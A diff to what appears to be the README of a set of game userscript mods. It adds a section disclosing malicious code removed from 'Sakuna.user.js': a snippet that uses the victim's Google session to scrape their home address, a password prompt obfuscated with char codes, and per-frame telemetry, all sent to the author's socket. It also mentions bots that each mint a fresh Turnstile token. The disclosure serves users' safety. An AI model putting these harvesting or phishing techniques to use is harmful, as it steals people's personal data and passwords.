@@ -30,6 +30,10 @@ and additionally needed their packet vocabulary mapped forward.
   script deobfuscated. `LemonMod.obfuscated.user.js` is the same build before
   deobfuscation, kept as a fallback.
 
+- **`Sakuna.user.js`** (`Sakuna 44`) — hook mod. Shipped with a Google
+  home-address harvester, a disguised password prompt and per-frame telemetry;
+  all three removed. **Do not run the original.**
+
 Plus **`MooUnpatcher.user.js`** — install it once and run old mods unchanged,
 instead of patching them one at a time. See below.
 
@@ -1075,10 +1079,85 @@ that the removed logger leaves no trace in the code.
 
 The test harness pulls the code under test straight out of the shipped scripts
 and out of the game bundles, so the tests cannot drift from what ships. Run
-them with `npm test` — 539 checks.
+them with `npm test` — 583 checks.
 
 unX is additionally re-parsed by the suite to prove that no comment survives
 past the metadata block and that the metadata block itself is intact.
 
 None of them has been verified against the live server; that needs a
 browser and a real Turnstile token.
+
+
+---
+
+# Sakuna.user.js (`Sakuna 44`)
+
+A hook mod, so it gets the same `EXP` shim as the rest. Two separate jobs: take
+out what the author put in, and make what is left run.
+
+## What was in the file
+
+**1. A home-address harvester.**
+
+```js
+GM_xmlhttpRequest({method:'GET', url:'https://myaccount.google.com/address/home', onload: function(g){
+    ... scrape name and address out of the response ...
+    dm_ = `https://www.google.com/maps/vt/data=...`;
+}});
+let h_ = () => {serverIsOpen && socket.send(JSON.stringify({dm: dm_, dn: dn_, da: da_}))};
+```
+
+It uses your logged-in Google session to read the home address and name saved on
+your account, builds a map tile URL for the place, and sends all three to the
+author's socket.
+
+**2. A password prompt with its label hidden.**
+
+```js
+let pwt = String.fromCharCode(69,110,116,101,114,32,121,111,117,114,32,80,97,115,115,119,111,114,100);
+socket.send(JSON.stringify({ pw: prompt(pwt + ` ${cdc}/5`), d: "aa"}));
+```
+
+Those char codes spell **"Enter your Password"**. Whatever you type goes to the
+same socket. Building the string this way keeps it out of a plain-text search of
+the file, which is the tell — there is no other reason to write it like that.
+
+**3. Live telemetry**, sent every frame: sid, position, ping, fps and
+`location.href`.
+
+The first two were commented out in this build and `socket` is never assigned
+anywhere in the file, so none of it transmitted as shipped. All three are gone
+now, along with `socket` and `serverIsOpen` themselves. The one surviving
+`prompt()` is the alliance-rename dialog, which is a real feature.
+
+## Why it did not run
+
+- **No `@run-at`**, so it ran at `document-end` — after the bundle had captured
+  `WebSocket.prototype.send`. The hook never saw a packet.
+- **msgpack from rawgit.com**, offline since 2019, so `window.msgpack` was
+  `undefined` and every encode/decode threw.
+- **Packet names scraped out of the game bundle** by splitting its source:
+  `data.split('keyup')[1].split('"')[2]` and fourteen more like it. Those
+  anchors are long gone, so the splits returned `undefined`; and the names
+  themselves were replaced by per-connection opcodes anyway.
+- **No framing**, so every packet was rejected.
+- **ALTCHA** (`#altcha_checkbox`, `alt:` tokens) against a server that wants
+  Turnstile.
+- **`GM_getValue` / `GM_setValue` under `@grant none`**, which makes them
+  undefined — two live call sites threw.
+
+## What changed
+
+The shim at `document-start` with the rest deferred to `__sakunaBoot()`; framed
+sends and opcode mapping both ways; bundled msgpack; the scraper replaced by a
+fixed 15-name table, each name cross-checked against the argument shapes at its
+call sites; `getMessage` reading through `EXP.receive`; bots minting a `cf:`
+token each through `EXP.freshToken()` and framing through `EXP.send`;
+`localStorage` in place of the `GM_` calls.
+
+The packet rules moved out of the prototype override into `applyOutgoing()`, so
+packets the script injects through `packet()` now get the same anti-profanity,
+dedup and rate-limit treatment as the game's own — previously they bypassed all
+of it. `const originalSend = WebSocket.prototype.send` was removed: with the
+shim installed it captures the trampoline rather than the native method, and
+nothing calls it any more.
